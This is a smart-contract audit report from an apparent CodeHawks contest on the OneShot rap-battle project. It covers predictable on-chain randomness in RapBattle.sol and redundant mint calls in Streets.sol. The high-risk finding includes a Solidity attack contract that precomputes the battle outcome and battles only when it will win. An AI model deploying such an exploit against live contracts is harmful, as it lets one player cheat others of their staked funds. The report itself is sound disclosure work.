# First Flight #10: One Shot - Findings Report

# Table of contents
- ## [Contest Summary](#contest-summary)
- ## [Results Summary](#results-summary)
- ## High Risk Findings
    - ### [H-01. Randomness in RapBattle.sol can be predicted](#H-01)

- ## Low Risk Findings
    - ### [L-01. Poor logic implementation results in unnecessary mint() transactions ](#L-01)


# <a id='contest-summary'></a>Contest Summary

### Sponsor: First Flight #10

### Dates: Feb 22nd, 2024 - Feb 29th, 2024

[See more contest details here](https://www.codehawks.com/contests/clstf5qd2000rakskkj0lkm33)

# <a id='results-summary'></a>Results Summary

### Number of findings:
   - High: 1
   - Medium: 0
   - Low: 1


# High Risk Findings

## <a id='H-01'></a>H-01. Randomness in RapBattle.sol can be predicted            

### Relevant GitHub Links
	
https://github.com/Sungyuk1/OneShotFirstFlight/blob/47f820dfe0ffde32f5c713bbe112ab6566435bf7/src/RapBattle.sol#L62

## Summary
The _battle function in RapBattle.sol uses the following code to aid in determining who wins the battle. 

        uint256 random = uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao, msg.sender))) % totalBattleSkill;

The random variable generated can easily be predicted. A user can use a smart contract to only call the goOnStageOrBattle() function in RapBattle.sol if they know that they are guaranteed to win. The 3 variables used to generate the "random" variable are all known at runtime. It is important to note that block.prevrandao does not generate a random number. Instead, it reads the RANDAO mix generated in the previous block.

## Vulnerability Details
Here is a crude implementation of a smart contract that could be used to predict the randomness. Note that we are assuming that the _credBet amount is 0. The point of this contract is just to showcase how the randomness can be gamed. Also in a production environment, this contract should be Ownable to prevent others from using your contract. 



    contract AttackContract is IERC721Receiver{  
        RapBattle rapBattle;
        OneShot oneShot;
        
        constructor(address _rapBattle, address _oneShot){
            rapBattle = RapBattle(_rapBattle);
            oneShot = OneShot(_oneShot);
        }

        //Mint a rapper for the smart contract
        function mintRapper() external{
            oneShot.mintRapper();
        }

        //Returns a boolean signifying if the contract battled or not
        function BattleOnlyIfWin(uint256 tokenId) external returns(bool){
            uint256 defenderTokenId = rapBattle.defenderTokenId();
            uint256 defenderRapperSkill = rapBattle.getRapperSkill(defenderTokenId);
            uint256 totalBattleSkill=defenderRapperSkill + rapBattle.getRapperSkill(tokenId);

            uint256 random =
                uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao, address(this)))) % totalBattleSkill;

            if(random <= defenderRapperSkill){
                return false;
            }else{
                oneShot.approve(address(rapBattle), tokenId);
                rapBattle.goOnStageOrBattle(tokenId, 0);
                return true;
            }
        }

        // Implementing IERC721Receiver so the contract can accept ERC721 tokens
        function onERC721Received(address, address, uint256, bytes calldata) external pure override returns (bytes4) {
            return IERC721Receiver.onERC721Received.selector;
        }
    }

## Impact
A user can precalculate the result of the random variable and only choose to battle when they are guaranteed to win. 

## Tools Used
Foundry
## Recommendations
Use an Oracle to provide randomness to the smart contract. 
		


# Low Risk Findings

## <a id='L-01'></a>L-01. Poor logic implementation results in unnecessary mint() transactions             

### Relevant GitHub Links
	
https://github.com/Sungyuk1/OneShotFirstFlight/blob/47f820dfe0ffde32f5c713bbe112ab6566435bf7/src/Streets.sol#L38

## Summary
The logic in the unstake() function in Street.sol causes unnecessary fees for users. Any user who has staked for more than 1 day will end up performing multiple credContract.mint() calls when only 1 is necessary. This will cause higher gas fees for the users. To the best of my knowledge, there is no benefit in implementing the logic in this manner, and it is a purely unnecessary cost. 

## Vulnerability Details
Here is the unstake() function in Street.sol. 


    // Unstake tokens by transferring them back to their owner
    function unstake(uint256 tokenId) external {
        require(stakes[tokenId].owner == msg.sender, "Not the token owner");
        uint256 stakedDuration = block.timestamp - stakes[tokenId].startTime;
        uint256 daysStaked = stakedDuration / 1 days;

        // Assuming RapBattle contract has a function to update metadata properties
        IOneShot.RapperStats memory stakedRapperStats = oneShotContract.getRapperStats(tokenId);

        emit Unstaked(msg.sender, tokenId, stakedDuration);
        delete stakes[tokenId]; // Clear staking info

        // Apply changes based on the days staked
        if (daysStaked >= 1) {
            stakedRapperStats.weakKnees = false;
            credContract.mint(msg.sender, 1);
        }
        if (daysStaked >= 2) {
            stakedRapperStats.heavyArms = false;
            credContract.mint(msg.sender, 1);
        }
        if (daysStaked >= 3) {
            stakedRapperStats.spaghettiSweater = false;
            credContract.mint(msg.sender, 1);
        }
        if (daysStaked >= 4) {
            stakedRapperStats.calmAndReady = true;
            credContract.mint(msg.sender, 1);
        }

        // Only call the update function if the token was staked for at least one day
        if (daysStaked >= 1) {
            oneShotContract.updateRapperStats(
                tokenId,
                stakedRapperStats.weakKnees,
                stakedRapperStats.heavyArms,
                stakedRapperStats.spaghettiSweater,
                stakedRapperStats.calmAndReady,
                stakedRapperStats.battlesWon
            );
        }

        // Continue with unstaking logic (e.g., transferring the token back to the owner)
        oneShotContract.transferFrom(address(this), msg.sender, tokenId);
    }

Look at how the if statements are structured. They are structured 1 - 4, and each if statement that is triggered causes a mint() transaction. Instead, the if statements should be structured 4-1 with each only performing a single mint transaction with the appropriate number of tokens. Also, else statements should be used so we can exit the logic early if possible. Here is an implementation of the fixed unstake() function.

    // Unstake tokens by transferring them back to their owner
    function unstake(uint256 tokenId) external {
        require(stakes[tokenId].owner == msg.sender, "Not the token owner");
        uint256 stakedDuration = block.timestamp - stakes[tokenId].startTime;
        uint256 daysStaked = stakedDuration / 1 days;

        // Assuming RapBattle contract has a function to update metadata properties
        IOneShot.RapperStats memory stakedRapperStats = oneShotContract.getRapperStats(tokenId);

        emit Unstaked(msg.sender, tokenId, stakedDuration);
        delete stakes[tokenId]; // Clear staking info

        // Apply changes based on the days staked
        if (daysStaked >= 4) {
            stakedRapperStats.calmAndReady = true;
            stakedRapperStats.spaghettiSweater = false;
            stakedRapperStats.heavyArms = false;
            stakedRapperStats.weakKnees = false;
            credContract.mint(msg.sender, 4);
        }
        else if (daysStaked == 3) {
            stakedRapperStats.spaghettiSweater = false;
            stakedRapperStats.heavyArms = false;
            stakedRapperStats.weakKnees = false;
            credContract.mint(msg.sender, 3);
        }
        else if (daysStaked == 2) {
            stakedRapperStats.heavyArms = false;
            stakedRapperStats.weakKnees = false;
            credContract.mint(msg.sender, 2);
        }else if(daysStaked == 1){
            stakedRapperStats.weakKnees = false;
            credContract.mint(msg.sender, 1);
        }

        // Only call the update function if the token was staked for at least one day
        if (daysStaked >= 1) {
            oneShotContract.updateRapperStats(
                tokenId,
                stakedRapperStats.weakKnees,
                stakedRapperStats.heavyArms,
                stakedRapperStats.spaghettiSweater,
                stakedRapperStats.calmAndReady,
                stakedRapperStats.battlesWon
            );
        }

        // Continue with unstaking logic (e.g., transferring the token back to the owner)
        oneShotContract.transferFrom(address(this), msg.sender, tokenId);
    }


Note that the last if statement [ if (daysStaked >= 1) ] can also be nested in the other if statements if even lower costs are desired. 

## Impact
Poor logic implementation leads to unnecessary costs. 

## Tools Used
Foundry

## Recommendations
Implement the logic in such a manner to minimize the computation performed and the transactions performed. 


